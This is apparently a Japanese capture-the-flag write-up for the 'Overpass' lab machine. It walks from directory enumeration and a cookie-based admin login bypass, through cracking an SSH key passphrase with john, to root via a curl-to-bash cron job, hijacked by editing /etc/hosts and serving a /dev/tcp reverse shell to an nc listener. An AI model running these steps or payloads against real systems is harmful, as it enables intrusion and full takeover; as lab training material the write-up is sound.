# Overpass

## ディレクトリ探索
gobusterコマンドでディレクトリを探す。
```shell
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e -x php,html,txt -u http://10.10.205.110
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.205.110
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/14 15:32:12 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.205.110/index.html           (Status: 301) [Size: 0] [--> ./]
http://10.10.205.110/img                  (Status: 301) [Size: 0] [--> img/]
http://10.10.205.110/downloads            (Status: 301) [Size: 0] [--> downloads/]
http://10.10.205.110/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
http://10.10.205.110/admin                (Status: 301) [Size: 42] [--> /admin/]  
http://10.10.205.110/admin.html           (Status: 200) [Size: 1525]              
Progress: 1576 / 350660 (0.45%)                                                  ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2021/08/14 15:32:50 Finished
===============================================================
```

## Administrotor area
ブラウザで/admin/へアクセス。ログイン画面が表示されるが、認証情報は不明。  
適当なID,PWを入れると「Incorrect Credentials」と表示される。  
login.jsを見ると、正常処理時にはSessionTokenというクッキーに値を入れて/adminへ遷移するぽい。
```JavaScript
if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
```

ブラウザのコンソールを使用して、適当にCookieを作成する。
```JavaScript
document.cookie="SessionToken=hoge"
```
この状態でリロードすると、Welcome to the Overpass Administrator areaページが表示される。

## SSH認証
ページにはJamesという名前と、SSHのキーがベタ書きされている。
SSHキーをファイル名`id_rsa`として、保存する。

SSHコマンドで接続試行するが、パスフレーズが不明。
```shell
$ chmod 600 rsa_id
$ ssh -i rsa_id james@10.10.205.110
Enter passphrase for key 'rsa_id': 
```

johnコマンドを使用してパスフレーズを割り出す。
```shell
$ python ssh2john.py rsa_id > id_rsa.hash
$ john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXX          (rsa_id)
1g 0:00:00:02 14.86% (ETA: 15:15:25) 0.4000g/s 941196p/s 941196c/s 941196C/s 17kiss..17hillview
Session aborted
```

見つけたパスフレーズを使用してSSH接続。  
ログイン先直下の`user.txt`が1つ目のフラグ。
```shell
$ ssh -i rsa_id james@10.10.205.110
Enter passphrase for key 'rsa_id': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Aug 14 06:19:15 UTC 2021

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.205.110
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{XXXXXX}
```

## root権限の取得方法模索
`sudo -l`では使えそうなものが見つからない。  
crontabを開くと、一番最後にroot権限で実行されるshが存在する。
```shell
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

shの置き場所である`overpass.thm`はどこなのか確認すると、127.0.0.1。  
これを書き換えれば、任意のサーバの`downloads/src/buildscript.sh`が実行されると思われるため、  
リバースシェルを狙う。  
自身の接続元マシンのIPアドレスに上書きして保存。
```text
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## リバースシェル
接続元PC上にshellを準備する。  
`downloads/src/buildscript.sh`の配置になるように適宜ディレクトリを作成。
```shell
bash -i >& /dev/tcp/MACHINEIP/8080 0>&1
```

別ウインドウで待ち受けの準備をする。  
```shell
$ nc -lvp 8080
listening on [any] 8080 ...
```

Webサーバを立ち上げる。  
crontabでアクセスされたタイミングでログが表示される。
```shell
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

アクセスされた直後、待ち受け側のウインドウに接続される。  
rootでのshellが確立されるので、`root.txt`を確認して完了。
```
10.10.205.110: inverse host lookup failed: Unknown host
connect to [XX] from (UNKNOWN) [10.10.205.110] 57858
bash: cannot set terminal process group (16995): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{XXXXXX}
```
